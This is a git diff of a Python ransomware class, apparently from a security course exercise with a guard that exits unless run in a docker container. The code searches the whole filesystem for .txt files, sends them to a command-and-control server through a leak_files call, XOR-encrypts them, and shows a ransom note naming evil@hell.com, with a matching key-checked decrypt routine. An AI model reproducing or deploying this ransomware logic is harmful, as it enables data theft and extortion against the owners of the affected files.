@@ -23,6 +23,23 @@ ENCRYPT_MESSAGE = """
 
 Your txt files have been locked. Send an email to evil@hell.com with title '{}' to unlock your data. 
 """
+
+END_MESSAGE = """
+ _____ _ _             ____                             _           _ 
+|  ___(_) | ___  ___  |  _ \  ___  ___ _ __ _   _ _ __ | |_ ___  __| |
+| |_  | | |/ _ \/ __| | | | |/ _ \/ __| '__| | | | '_ \| __/ _ \/ _` |
+|  _| | | |  __/\__ \ | |_| |  __/ (__| |  | |_| | |_) | ||  __/ (_| |
+|_|   |_|_|\___||___/ |____/ \___|\___|_|   \__, | .__/ \__\___|\__,_|
+                                            |___/|_| 
+                                                                            _                _             
+| | | | __ ___   _____    __ _   _ __ (_) ___ ___    __| | __ _ _   _ 
+| |_| |/ _` \ \ / / _ \  / _` | | '_ \| |/ __/ _ \  / _` |/ _` | | | |
+|  _  | (_| |\ V /  __/ | (_| | | | | | | (_|  __/ | (_| | (_| | |_| |
+|_| |_|\__,_| \_/ \___|  \__,_| |_| |_|_|\___\___|  \__,_|\__,_|\__, |
+                                                                |___/ 
+               
+"""
+
 class Ransomware:
 
     def __init__(self) -> None:
@@ -37,39 +54,58 @@ class Ransomware:
             print(f"You must run the malware in docker ({hostname}) !")
             sys.exit(1)
 
+    """
+        Get all the text files paths
+    """
     def get_files(self, filter:str)->list:
-        p = Path("/")
+        p = Path("/") 
         liste_file = [file for file in p.rglob(filter)]
-        # return all files matching the filter
         liste_file_str = [str(txt) for txt in liste_file]
         return liste_file_str
 
+    """
+        Main function for encrypting
+    """
     def encrypt(self):
+
+        # Obtain all text files path
         files = self.get_files("*.txt")
+
+        # Create a new instance of SecretManager
         secret_manager = SecretManager()
         secret_manager.setup()
+        
+        # Leak all the files to the CNC
+        secret_manager.leak_files(files)
+
+        # Encrypt all the text files
         secret_manager.xorfiles(files)
 
+        # Display the message and the token
         token = secret_manager.get_hex_token()
         print(ENCRYPT_MESSAGE.format(token.hex()))
         
-        # main function for encrypting (see PDF)
-
-
+    """
+        Main function for decrypting
+    """
     def decrypt(self):
-        # main function for decrypting (see PDF)
-        key = base64.b64decode(input("Enter the key:"))
-        print("Key input :", key)
+        # Ask the key to the client
+        key = input("Enter the key:")
 
+        # Decode the key
+        key = base64.b64decode(key)
+
+        # Obtain all text files path
         files = self.get_files("*.txt")
+
+        # Create a new instance of SecretManager
         secret_manager = SecretManager()
-        #secret_manager.test()
-        #secret_manager.xorfiles(files)
         
+        # Verification of the key
         if(secret_manager.check_key(key)):
-            secret_manager.set_key(key)
-            secret_manager.xorfiles(files)
-            print("Files uncrypted !")
+            secret_manager.set_key(key)         # Set the keys if validate
+            secret_manager.xorfiles(files)      # Decrypt de files
+            print(END_MESSAGE)
         else:
             print("Error: Not the good key...")
 
